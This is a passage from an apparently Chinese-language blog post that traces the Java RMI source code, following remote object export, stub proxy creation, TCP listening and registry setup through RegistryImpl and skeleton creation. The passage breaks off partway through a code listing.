<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote obj, UnicastServerRef sref)</span></span><br><span class="line">    <span class="keyword">throws</span> RemoteException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// if obj extends UnicastRemoteObject, set its ref.</span></span><br><span class="line">    <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> UnicastRemoteObject) &#123;</span><br><span class="line">        ((UnicastRemoteObject) obj).ref = sref;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sref.exportObject(obj, <span class="literal">null</span>, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里的<strong>sref</strong>其实就是包含了刚创建的<strong>LiveRef</strong>的<strong>UnicastServerRef</strong></p>
<p>也就是说，现在调用的是<strong>UnicastServerRef</strong>的<strong>exportObject</strong>方法，来看看做了什么</p>
<p>可以看到在这边创建了<strong>stub</strong>，原因是</p>
<ul>
<li><strong>RMI</strong>会先在服务端创建一个<strong>Stub</strong>，再把<strong>Stub</strong>传到<strong>RMI Registry</strong>中，最后让<strong>RMI Client</strong>去获取<strong>Stub</strong>。</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote impl, Object data,</span></span><br><span class="line"><span class="params">                           <span class="type">boolean</span> permanent)</span></span><br><span class="line">    <span class="keyword">throws</span> RemoteException</span><br><span class="line">&#123;</span><br><span class="line">    Class&lt;?&gt; implClass = impl.getClass();</span><br><span class="line">    Remote stub;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        stub = Util.createProxy(implClass, getClientRef(), forceStubUse);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExportException</span>(</span><br><span class="line">            <span class="string">&quot;remote object implements illegal remote interface&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (stub <span class="keyword">instanceof</span> RemoteStub) &#123;</span><br><span class="line">        setSkeleton(impl);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">Target</span> <span class="variable">target</span> <span class="operator">=</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Target</span>(impl, <span class="built_in">this</span>, stub, ref.getObjID(), permanent);</span><br><span class="line">    ref.exportObject(target);</span><br><span class="line">    hashToMethod_Map = hashToMethod_Maps.get(implClass);</span><br><span class="line">    <span class="keyword">return</span> stub;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到在<strong>createProxy</strong>中有个判断</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title function_">createProxy</span><span class="params">(Class&lt;?&gt; implClass,</span></span><br><span class="line"><span class="params">                                 RemoteRef clientRef,</span></span><br><span class="line"><span class="params">                                 <span class="type">boolean</span> forceStubUse)</span></span><br><span class="line">    <span class="keyword">throws</span> StubNotFoundException</span><br><span class="line">&#123;	</span><br><span class="line">    <span class="comment">//省略部分代码</span></span><br><span class="line">    <span class="keyword">if</span> (forceStubUse ||</span><br><span class="line">        !(ignoreStubClasses || !stubClassExists(remoteClass)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> createStub(remoteClass, clientRef);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//省略部分代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>看看那个判断中的<strong>stubClassExists</strong>做了什么</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">stubClassExists</span><span class="params">(Class&lt;?&gt; remoteClass)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!withoutStubs.containsKey(remoteClass)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class.forName(remoteClass.getName() + <span class="string">&quot;_Stub&quot;</span>,</span><br><span class="line">                          <span class="literal">false</span>,</span><br><span class="line">                          remoteClass.getClassLoader());</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException cnfe) &#123;</span><br><span class="line">            withoutStubs.put(remoteClass, <span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看出主要是用于通过加载远程类名称加上**”_Stub”<strong>后缀的类，来检查给定的远程类是否存在对应的</strong>stub**类</p>
<p>在<strong>RMI</strong>中，常用于在执行远程调用之前，检查远程接口和<strong>stub</strong>类的正确性</p>
<p>目前我们是没有这个类的，所以也不会去执行判断里的<strong>createStub</strong>方法</p>
<p>判断后就是创建动态代理的流程了</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title function_">createProxy</span><span class="params">(Class&lt;?&gt; implClass,</span></span><br><span class="line"><span class="params">                                 RemoteRef clientRef,</span></span><br><span class="line"><span class="params">                                 <span class="type">boolean</span> forceStubUse)</span></span><br><span class="line">    <span class="keyword">throws</span> StubNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//省略部分代码......</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> implClass.getClassLoader();</span><br><span class="line">    <span class="keyword">final</span> Class&lt;?&gt;[] interfaces = getRemoteInterfaces(implClass);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(clientRef);</span><br><span class="line">    <span class="comment">/* REMIND: private remote interfaces? */</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Remote&gt;() &#123;</span><br><span class="line">            <span class="keyword">public</span> Remote <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> (Remote) Proxy.newProxyInstance(loader,</span><br><span class="line">                                                       interfaces,</span><br><span class="line">                                                       handler);</span><br><span class="line">            &#125;&#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StubNotFoundException</span>(<span class="string">&quot;unable to create proxy&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>第一个参数是<strong>AppClassLoader</strong>，第二个参数是一个<strong>远程接口</strong>，第三个参数是<strong>调用处理器</strong>，调用处理器里面只有一个 ref，还是原本那个封装的<strong>LiveRef</strong></p>
<p>这边也就把动态代理创建好了</p>
<p>返回<strong>exportObject</strong>中，往下走会出现一个判断，不过会跳过这个判断</p>
<p>因为在上面创建<strong>Stub</strong>的时候没有走进<strong>createStub()<strong>，返回的对象没有继承</strong>RemoteStub</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote impl, Object data,</span></span><br><span class="line"><span class="params">                           <span class="type">boolean</span> permanent)</span></span><br><span class="line">    <span class="keyword">throws</span> RemoteException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    <span class="keyword">if</span> (stub <span class="keyword">instanceof</span> RemoteStub) &#123;</span><br><span class="line">        setSkeleton(impl);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">Target</span> <span class="variable">target</span> <span class="operator">=</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Target</span>(impl, <span class="built_in">this</span>, stub, ref.getObjID(), permanent);</span><br><span class="line">    ref.exportObject(target);</span><br><span class="line">    hashToMethod_Map = hashToMethod_Maps.get(implClass);</span><br><span class="line">    <span class="keyword">return</span> stub;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>接着会走到<strong>target</strong>这里，看一下在<strong>Target</strong>对象里都封装了什么</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">Target</span><span class="params">(Remote impl, Dispatcher disp, Remote stub, ObjID id,</span></span><br><span class="line"><span class="params">              <span class="type">boolean</span> permanent)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">this</span>.weakImpl = <span class="keyword">new</span> <span class="title class_">WeakRef</span>(impl, ObjectTable.reapQueue);</span><br><span class="line">    <span class="built_in">this</span>.disp = disp;</span><br><span class="line">    <span class="built_in">this</span>.stub = stub;</span><br><span class="line">    <span class="built_in">this</span>.id = id;</span><br><span class="line">    <span class="built_in">this</span>.acc = AccessController.getContext();</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * ......</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">threadContextLoader</span> <span class="operator">=</span></span><br><span class="line">        Thread.currentThread().getContextClassLoader();</span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">serverLoader</span> <span class="operator">=</span> impl.getClass().getClassLoader();</span><br><span class="line">    <span class="keyword">if</span> (checkLoaderAncestry(threadContextLoader, serverLoader)) &#123;</span><br><span class="line">        <span class="built_in">this</span>.ccl = threadContextLoader;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.ccl = serverLoader;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">this</span>.permanent = permanent;</span><br><span class="line">    <span class="keyword">if</span> (permanent) &#123;</span><br><span class="line">        pinImpl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里的<strong>ref</strong>还是<strong>LiveRef</strong>，接着调用<strong>ref</strong>的<strong>exportObject</strong>方法将<strong>target</strong>发布出去</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public void exportObject(Target target) throws RemoteException &#123;</span><br><span class="line">    ep.exportObject(target);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public void exportObject(Target target) throws RemoteException &#123;</span><br><span class="line">    transport.exportObject(target);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>一路跟到这里<strong>sun.rmi.transport.tcp</strong>下的<strong>TCPTransport</strong>类的<strong>exportObject</strong>方法</p>
<p>首先走到了<strong>listen</strong>里面，开始了网络监听，也就是真正的网络请求部分</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exportObject</span><span class="params">(Target target)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Ensure that a server socket is listening, and count this</span></span><br><span class="line"><span class="comment">     * export while synchronized to prevent the server socket from</span></span><br><span class="line"><span class="comment">     * being closed due to concurrent unexports.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">        listen();</span><br><span class="line">        exportCount++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>看一下<strong>listen</strong>中做了什么</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">listen</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="keyword">assert</span> Thread.holdsLock(<span class="built_in">this</span>);</span><br><span class="line">    <span class="type">TCPEndpoint</span> <span class="variable">ep</span> <span class="operator">=</span> getEndpoint();</span><br><span class="line">    <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> ep.getPort();</span><br><span class="line">    <span class="keyword">if</span> (server == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (tcpLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">            tcpLog.log(Log.BRIEF,</span><br><span class="line">                <span class="string">&quot;(port &quot;</span> + port + <span class="string">&quot;) create server socket&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            server = ep.newServerSocket();</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * Don&#x27;t retry ServerSocket if creation fails since</span></span><br><span class="line"><span class="comment">             * &quot;port in use&quot; will cause export to hang if an</span></span><br><span class="line"><span class="comment">             * RMIFailureHandler is not installed.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="type">Thread</span> <span class="variable">t</span> <span class="operator">=</span> AccessController.doPrivileged(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">NewThreadAction</span>(<span class="keyword">new</span> <span class="title class_">AcceptLoop</span>(server),</span><br><span class="line">                                    <span class="string">&quot;TCP Accept-&quot;</span> + port, <span class="literal">true</span>));</span><br><span class="line">            t.start();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//省略部分代码......</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>先获取<strong>TCPEndpoint</strong>，然后会开启一个新的<strong>ServerSocket</strong>，并且创建一个新的线程<strong>Thread</strong></p>
<p>在<strong>newServerSocket</strong>中，如果<strong>port&#x3D;&#x3D;0</strong>还会给<strong>port</strong>随机赋值</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">ServerSocket <span class="title function_">newServerSocket</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    <span class="keyword">if</span> (listenPort == <span class="number">0</span>)</span><br><span class="line">        setDefaultPort(server.getLocalPort(), csf, ssf);</span><br><span class="line">    <span class="keyword">return</span> server;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这部分都是一些网络方面的东西，不太懂就先跳过了。。。</p>
<p>然后到这里的化，远程对象已经在服务端上的随机端口发布出去了</p>
<p>后面这部分就是记录一下远程对象发布到哪里去了</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exportObject</span><span class="params">(Target target)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">ok</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.exportObject(target);</span><br><span class="line">        ok = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!ok) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">                decrementExportCount();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>看一下这个**super.exportObject(target)**做了什么</p>
<p>主要是**ObjectTable.putTarget(target)**这部分</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exportObject</span><span class="params">(Target target)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    target.setExportedTransport(<span class="built_in">this</span>);</span><br><span class="line">    ObjectTable.putTarget(target);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>来看一下<strong>putTarget</strong>，主要是在<strong>put</strong>部分</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">putTarget</span><span class="params">(Target target)</span> <span class="keyword">throws</span> ExportException &#123;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    <span class="keyword">synchronized</span> (tableLock) &#123;</span><br><span class="line">        <span class="keyword">if</span> (target.getImpl() != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">//省略部分代码</span></span><br><span class="line">            objTable.put(oe, target);</span><br><span class="line">            implTable.put(weakImpl, target);</span><br><span class="line">            <span class="keyword">if</span> (!target.isPermanent()) &#123;</span><br><span class="line">                incrementKeepAliveCount();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>也就是说，将信息存储在<strong>ObjectTable</strong>类的两个静态Map中</p>
<p>相当于给服务端做了个备份吧</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Map&lt;ObjectEndpoint,Target&gt; objTable =</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Map&lt;WeakRef,Target&gt; implTable =</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br></pre></td></tr></table></figure></div>

<h2 id="创建注册中心"><a href="#创建注册中心" class="headerlink" title="创建注册中心"></a>创建注册中心</h2><p>首先会进入到一个静态方法<strong>createRegistry</strong>中，传一个端口，默认是<strong>1099</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Registry <span class="title function_">createRegistry</span><span class="params">(<span class="type">int</span> port)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RegistryImpl</span>(port);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>创建的这个<strong>RegistryImpl</strong>对象，首先会做个安全检查</p>
<p>后面创建了个<strong>LiveRef</strong>，以及创建了一个新的<strong>UnicastServerRef</strong>，这里跟前面的创建的<strong>远程对象</strong>是很像的</p>
<p>也就说这里又创建一个<strong>服务端引用</strong>，作为参数交给了<strong>setup</strong>方法，跟服务端创建远程对象类似</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">RegistryImpl</span><span class="params">(<span class="type">int</span> port)</span></span><br><span class="line">    <span class="keyword">throws</span> RemoteException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (port == Registry.REGISTRY_PORT &amp;&amp; System.getSecurityManager() != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// grant permission for default port only.</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedExceptionAction</span>&lt;Void&gt;() &#123;</span><br><span class="line">                <span class="keyword">public</span> Void <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">                    <span class="type">LiveRef</span> <span class="variable">lref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, port);</span><br><span class="line">                    setup(<span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(lref));</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">SocketPermission</span>(<span class="string">&quot;localhost:&quot;</span>+port, <span class="string">&quot;listen,accept&quot;</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (PrivilegedActionException pae) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (RemoteException)pae.getException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">LiveRef</span> <span class="variable">lref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, port);</span><br><span class="line">        setup(<span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(lref));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们可以先看一下<strong>UnicastServerRef</strong>做了什么，主要是将<strong>liveRef</strong>赋值给<strong>ref</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">UnicastServerRef</span><span class="params">(LiveRef ref)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(ref);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">UnicastRef</span><span class="params">(LiveRef liveRef)</span> &#123;</span><br><span class="line">    ref = liveRef;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">UnicastRef</span><span class="params">(LiveRef liveRef)</span> &#123;</span><br><span class="line">    ref = liveRef;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>现在我们去看一下<strong>setup</strong>方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">setup</span><span class="params">(UnicastServerRef uref)</span></span><br><span class="line">    <span class="keyword">throws</span> RemoteException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Server ref must be created and assigned before remote</span></span><br><span class="line"><span class="comment">     * object &#x27;this&#x27; can be exported.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    ref = uref;</span><br><span class="line">    uref.exportObject(<span class="built_in">this</span>, <span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>一样，也是调了<strong>UnicastServerRef</strong>对象的<strong>exportObject</strong>方法</p>
<p>第一个参数代表远程对象，创建远程对象就是自己实现的<strong>Impl</strong>，创建注册中心就是<strong>RegistryImpl</strong></p>
<p>第三个参数代表时效选项，上次是<strong>false</strong>，这次变成了<strong>true</strong></p>
<p>接着来看一下<strong>exportObject</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote impl, Object data,</span></span><br><span class="line"><span class="params">                           <span class="type">boolean</span> permanent)</span></span><br><span class="line">    <span class="keyword">throws</span> RemoteException</span><br><span class="line">&#123;</span><br><span class="line">    Class&lt;?&gt; implClass = impl.getClass();</span><br><span class="line">    Remote stub;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        stub = Util.createProxy(implClass, getClientRef(), forceStubUse);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExportException</span>(</span><br><span class="line">            <span class="string">&quot;remote object implements illegal remote interface&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (stub <span class="keyword">instanceof</span> RemoteStub) &#123;</span><br><span class="line">        setSkeleton(impl);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">Target</span> <span class="variable">target</span> <span class="operator">=</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Target</span>(impl, <span class="built_in">this</span>, stub, ref.getObjID(), permanent);</span><br><span class="line">    ref.exportObject(target);</span><br><span class="line">    hashToMethod_Map = hashToMethod_Maps.get(implClass);</span><br><span class="line">    <span class="keyword">return</span> stub;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>首先也是创建<strong>stub</strong>，直接看一下<strong>createProxy</strong>方法</p>
<p>对比创建远程对象，创建注册中心到这里是直接走进去判断里面的<strong>createStub</strong>方法</p>
<p>原因是因为，在<strong>stubClassExists</strong>检测的时候</p>
<p>会发现现在是系统自带的类(在<strong>rt.jar-&gt;sun-&gt;rmi</strong>可以找到<strong>RegistryImpl_Stub</strong>)，符合条件</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title function_">createProxy</span><span class="params">(Class&lt;?&gt; implClass,</span></span><br><span class="line"><span class="params">                                 RemoteRef clientRef,</span></span><br><span class="line"><span class="params">                                 <span class="type">boolean</span> forceStubUse)</span></span><br><span class="line">    <span class="keyword">throws</span> StubNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    Class&lt;?&gt; remoteClass;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        remoteClass = getRemoteClass(implClass);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ex ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StubNotFoundException</span>(</span><br><span class="line">            <span class="string">&quot;object does not implement a remote interface: &quot;</span> +</span><br><span class="line">            implClass.getName());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (forceStubUse ||</span><br><span class="line">        !(ignoreStubClasses || !stubClassExists(remoteClass)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> createStub(remoteClass, clientRef);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>继续往下，调用<strong>exportObject</strong>的**setSkeleton()**方法，</p>
<p>这时的<strong>RegistryImpl_Stub</strong>对象确实是<strong>RemoteStub</strong>的子类，所以满足条件，进入<strong>setSkeleton</strong>方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSkeleton</span><span class="params">(Remote impl)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="keyword">if</span> (!withoutSkeletons.containsKey(impl.getClass())) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            skel = Util.createSkeleton(impl);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SkeletonNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * Ignore exception for skeleton class not found, because a</span></span><br><span class="line"><span class="comment">             * skeleton class is not necessary with the 1.2 stub protocol.</span></span><br><span class="line"><span class="comment">             * Remember that this impl&#x27;s class does not have a skeleton</span></span><br><span class="line"><span class="comment">             * class so we don&#x27;t waste time searching for it again.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            withoutSkeletons.put(impl.getClass(), <span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然后这里有一个<strong>createSkeleton()<strong>方法，一看名字就知道是用来创建</strong>Skeleton</strong>的</p>
<p>可以看到<strong>Skeleton</strong>是用**forName()**的方式创建的</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> RemoteStub <span class="title function_">createStub</span><span class="params">(Class&lt;?&gt; remoteClass, RemoteRef ref)</span></span><br><span class="line">    <span class="keyword">throws</span> StubNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">stubname</span> <span class="operator">=</span> remoteClass.getName() + <span class="string">&quot;_Stub&quot;</span>;</span><br><span class="line">    <span class="comment">/* Make sure to use the local stub loader for the stub classes.</span></span><br><span class="line"><span class="comment">     * When loaded by the local loader the load path can be</span></span><br><span class="line"><span class="comment">     * propagated to remote clients, by the MarshalOutputStream/InStream</span></span><br><span class="line"><span class="comment">     * pickle methods</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Class&lt;?&gt; stubcl =</span><br><span class="line">            Class.forName(stubname, <span class="literal">false</span>, remoteClass.getClassLoader());</span><br><span class="line">        Constructor&lt;?&gt; cons = stubcl.getConstructor(stubConsParamTypes);</span><br><span class="line">        <span class="keyword">return</span> (RemoteStub) cons.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; ref &#125;);</span><br><span class="line">    &#125; </span><br><span class="line">    <span 